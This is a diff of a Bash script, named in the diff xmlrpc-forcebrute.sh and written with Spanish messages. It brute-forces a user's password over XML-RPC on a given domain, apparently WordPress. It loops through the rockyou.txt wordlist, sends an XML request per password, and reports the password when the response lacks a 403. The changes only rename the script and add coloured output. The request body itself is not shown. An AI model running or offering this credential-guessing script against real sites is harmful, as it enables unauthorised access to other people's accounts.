@@ -1,4 +1,5 @@
 #!/bin/bash
+green='\033[92m' #setup colors
 wordlist="/usr/share/wordlists/rockyou.txt"
 
 if [ ! -f "$wordlist" ]; then
@@ -8,13 +9,11 @@ fi
 
 if [ -z "$1" ]; then
     echo "Usuario no seleccionado."
-    echo "./aaa.sh USER DOMAIN"
+    echo "./xmlrpc-forcebrute.sh USER DOMAIN"
 elif [ -z "$2" ]; then
     echo "Dominio no seleccionado."
-    echo "./aaa.sh USER DOMAIN"
+    echo "./xmlrpc-forcebrute.sh USER DOMAIN"
 else
-
-
     cat $wordlist | while read LINE; do
         rm /tmp/curl.tmp /tmp/enviar.xml
         cat <<< "
@@ -35,9 +34,8 @@ else
 
 
         if [ ! "$(cat /tmp/curl.tmp | grep '403')" ]; then
-            echo -e "[+] La contraseña para $1 es $LINE"
+	        echo "" && echo -e "$green""[+] La contraseña para $1 es $LINE"
             exit 0
         fi
-
     done
 fi
